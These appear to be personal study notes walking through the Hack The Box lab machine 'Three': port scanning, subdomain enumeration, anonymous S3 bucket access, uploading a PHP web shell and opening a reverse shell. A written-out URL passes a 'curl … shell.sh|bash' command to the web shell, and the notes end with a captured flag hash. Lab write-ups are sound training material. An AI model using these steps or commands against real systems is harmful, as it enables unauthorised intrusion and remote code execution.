---
title: 'Three:'
updated: 2022-10-17T21:40:49.0000000+01:00
created: 2022-09-22T20:33:46.0000000+01:00
---

How many TCP ports are open?:

*2 TCP (Transmission Control Protocol) ports are open, as indicated by our nmap scan.*

What is the domain of the email address provided in the "Contact" section of the website?

*Looking at the contents section of the website reveals:*
![image1](../../../../../_resources/image1-60.png)
*So The domain name is @thetoppers.htb*

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

*We use /etc/hosts to resolve hostnames to IP addresses, [read more.](https://debian-handbook.info/browse/stable/sect.hostname-name-service.html)*

Which sub-domain is discovered during further enumeration?

*We receive this list:*

![image2](../../../../../_resources/image2-45.png)

s3.thetoppers.htb is the answer since, the other sub-domains have had a bad request (400) whilst the actual domain has a bad gateway. Meaning we need to add it to our hosts file.

echo "IP s3.thetoppers.htb" \| sudo tee -a /etc/hosts

This allows us to access the s3.thetopper.htb domain. Which appears to involve AWS. We are able to interact with this AWS S3 Bucket using awscli.

What is an S3 bucket?:

An S3 bucket is a **cloud-based object storage service**. AWS S3 Buckets can store many different things, but are often used to store:

- Backup files
- Media Hosting
- Software Delivery
- Static Websites

Getting the Reverse Shell:

To get the reverse shell we need to trigger the remote host to connect back to our local machines IP on a specified listening port.

1.  Get the Tun0 IP address of our local machine
    1.  We can do this using *ifconfig*
2.  We can create a shell script that will connect the remote host to our machine.
    1.  This is referred to as a **bash reverse shell payload**
3.  Make our port listen for the remote host
    1.  We will use *ncat* on port 1337 for this.
4.  Start a web server on our local machine and host the bash file.
    1.  The web server needs to be run from the directory that contains the reverse shell file.
5.  We then use the curl utility and pipe it into bash and execute it.

Then you have a reverse shell.

Reverse Shell Code:

1.  ![image3](../../../../../_resources/image3-38.png)

2\.
![image4](../../../../../_resources/image4-30.png)

3\.
![image5](../../../../../_resources/image5-20.png)

4\.
![image6](../../../../../_resources/image6-12.png)

5\.
[http://thetoppers.htb/shell.php?cmd=curl%2010.10.17.8:8000/shell.sh\|bash](http://thetoppers.htb/shell.php?cmd=curl%2010.10.17.8:8000/shell.sh|bash)

Thus we have a reverse shell, we can then locate the flag:
![image7](../../../../../_resources/image7-9.png)

Firstly, lets scan the machine using nmap to look at all available ports, this gives us the following information:
![image8](../../../../../_resources/image8-7.png)

![image9](../../../../../_resources/image9-6.png)

Looking at the IP using a web browser shows a band themed website.

In order to progress it looks like we need to be able to resolve the hostname from the IP address. Editing the hosts file within etc to:
![image10](../../../../../_resources/image10-4.png)

Allows us to access the website from its domain name. Trying nmap again but on the domain gives us nothing new. We need to use a tool like **wfuzz** or **ffuf** (Fuzz Faster U Fool)**.**

Sub-domain enumeration:

A sub-domain is a piece of additional information that is added to the beginning of a website's domain name. It allows websites to separate and organize content for a specific function.

Normal Website: **Hackthebox.com**
CTF subdomain: **Ctf.hackthebox.com**

Even though the URL changes you are still on the same webpage, we can use tools like dirb, dirbuster, GoBuster, wfuzz, ffuf and feroxbuster + a sub-domain wordlist to scan for the most common sub-domains.

Using GoBuster:

To scan for additional sub-domains we would use:
![image11](../../../../../_resources/image11-3.png)

With the flags representing:
![image12](../../../../../_resources/image12-1.png)

Accessing an S3 Bucket:

Occasionally AWS servers can be configured to not check for authentication when accessing them, you can just fill every field with temp when trying to log in as an unauthorized user.
![image13](../../../../../_resources/image13.png)

We can list all S3 buckets using ls:
![image14](../../../../../_resources/image14.png)

Since in our example there is only 1 bucket we get:
![image15](../../../../../_resources/image15.png)

We can also use ls to find objects and common prefixes. In our example we get the following:
![image16](../../../../../_resources/image16.png)

Copying Files Using aswcli:

Now we know that the root of a web server (Webroot) is running on the machine. We can upload a php shell file to the bucket, then visit the page in our browser and achieve remote code execution.

We can use a single line of php code and get access to the shell
![image17](../../../../../_resources/image17.png)
We then are able to upload it to the AWS Bucket:
![image18](../../../../../_resources/image18.png)

Now that we can execute code on the box, we can get the reverse shell.

a980d99281a28d638ac68b9bf9453c2b
